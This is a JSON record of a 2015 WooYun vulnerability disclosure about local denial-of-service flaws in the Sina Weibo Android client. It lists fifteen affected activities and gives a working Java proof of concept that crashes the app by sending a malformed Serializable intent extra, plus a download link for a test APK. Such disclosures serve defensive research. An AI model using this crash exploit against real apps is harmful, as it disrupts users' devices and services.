{"id": 37052, "wybug_id": "wooyun-2015-0100543", "wybug_title": "新浪微博客户端多处本地拒绝服务漏洞", "wybug_corp": "新浪微博", "wybug_author": "Nicky", "wybug_date": "2015-03-10 18:30", "wybug_open_date": "2015-06-09 16:38", "wybug_type": "拒绝服务", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-09：\t细节向公众公开  简要描述： 新浪微博客户端多处本地拒绝服务漏洞，可造成应用无限崩溃 详细说明：  新浪微博客户端多处组件在本地拒绝服务，原因在于应用中使用了getSerializableExtra() 的API，由于开发者没有对传入的数据做异常判断，恶意应用可以通过传入畸形数据，导致应用本地拒绝服务。存在问题的组件：com.sina.weibo.weiyouinterface.DMMessageBoxPreLoadingActivitycom.sina.weibo.page.PageDetailActivitycom.sina.weibo.page.UserWeiboAttentionFansListcom.sina.weibo.ComposerDispatchActivitycom.sina.weibo.photoalbum.PhotoAlbumActivitycom.sina.weibo.ChooseContactsActivitycom.sina.weibo.FriendRecommendActivitycom.sina.weibo.PayCommonForwardActivitycom.sina.weibo.MyWeiboTailActivitycom.sina.weibo.appmarket.sng.activity.SngGiftBagListActivitycom.sina.weibo.page.CardInfoListActivitycom.sina.weibo.PayOrderInfoLoderActivitycom.sina.weibo.ContactsSynActivitycom.sina.weibo.GetFriendActivitycom.sina.weibo.PageDiscussActivity   漏洞证明：  \n\n关键利用代码：\npublic class MainActivity extends Activity {    @Override    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        Intent intent = new Intent();        intent.setComponent(new ComponentName(\"com.sina.weibo\", \"com.sina.weibo.weiyouinterface.DMMessageBoxPreLoadingActivity\"));        intent.putExtra(\"this_is_a_random_serializable_extra_for_test_general_reject_server\", new SerializableObject());        startActivity(intent);    }    @Override    public boolean onCreateOptionsMenu(Menu menu) {        // Inflate the menu; this adds items to the action bar if it is present.        getMenuInflater().inflate(R.menu.menu_main, menu);        return true;    }    @Override    public boolean onOptionsItemSelected(MenuItem item) {        // Handle action bar item clicks here. The action bar will        // automatically handle clicks on the Home/Up button, so long        // as you specify a parent activity in AndroidManifest.xml.        int id = item.getItemId();        //noinspection SimplifiableIfStatement        if (id == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(item);    }}class SerializableObject implements Serializable {    static final long serialVersionUID = 42L;    SerializableObject() {        super();    }}\n给个测试的apk，安装后打开，正在运行的微博客户端会自动崩溃链接: http://pan.baidu.com/s/1i3CG4x3 密码: cfik   修复方案：  添加异常处理   版权声明：转载请注明来源 Nicky@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-03-11 16:36 厂商回复： 感谢关注新浪安全，漏洞修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-22 22:02 |    \t\t小荷才露尖尖角 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:13        | less is more)\t\t \n  还可以刷这种类型的漏洞啊http://www.droidsec.cn/android-app%e9%80%9a%e7%94%a8%e5%9e%8b%e6%8b%92%e7%bb%9d%e6%9c%8d%e5%8a%a1%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e6%8a%a5%e5%91%8a/    \n     2015-03-22 22:16 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:69        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  @小荷才露尖尖角 对一些用户量很大的APP来说这类漏洞还是有一定影响的    \n     2015-04-01 10:03 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  @小荷才露尖尖角 这就是他的站    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}